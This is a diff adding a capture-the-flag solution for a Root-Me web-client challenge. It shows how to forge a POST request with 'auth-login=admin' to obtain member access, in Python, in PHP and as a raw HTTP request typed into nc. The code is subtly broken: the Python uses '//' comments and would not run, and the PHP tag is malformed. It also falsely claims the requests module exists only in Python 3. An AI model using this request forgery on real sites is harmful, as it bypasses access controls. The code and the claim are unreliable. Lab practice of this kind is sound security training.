@@ -1,0 +1,43 @@
+In python (>3.0):
+
+import requests // requests module only available in Python >3
+// make a POST request with auth-login and authbutton set
+r = requests.post('http://challenge01.root-me.org/web-client/ch25/',
+    data = {'auth-login':'admin', 'authbutton':'Member+Access'});
+// print the server's response
+print(r.text);
+In PHP:
+
+<php
+    // parameters of the POST request
+    $params = array ('auth-login' => 'admin', 'authbutton' => 'Member+Access');
+    // http://php.net/manual/en/function.http-build-query.php for more info
+    $query = http_build_query($params);
+    // "Connection: close" specifies to the server we don't need the connection
+    // to be kept open after the response has been sent; Content-Length is
+    // mandatory; see HTTP specification for more info
+    $contextData = array ( 
+        'method' => 'POST',
+        'header' => "Connection: close\r\n".
+                    "Content-Length: ".strlen($query)."\r\n",
+        'content'=> $query );
+    // Creates the stream to write to and read from;
+    // http://php.net/manual/en/function.stream-context-create.php for more info
+    $context = stream_context_create(array ( 'http' => $contextData ));
+    $response =  file_get_contents(
+        "http://challenge01.root-me.org/web-client/ch25/",
+        false,
+        $context);
+    
+    // print server's response
+    echo $response;
+?>
+Or (a bit brutish) manually, via the command-line:
+- nc challenge01.root-me.org 80
+- POST /web-client/ch25/ HTTP/1.1
+Host: challenge01.root-me.org
+Connection: close;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 41
+
+auth-login=admin&authbutton=Member+access
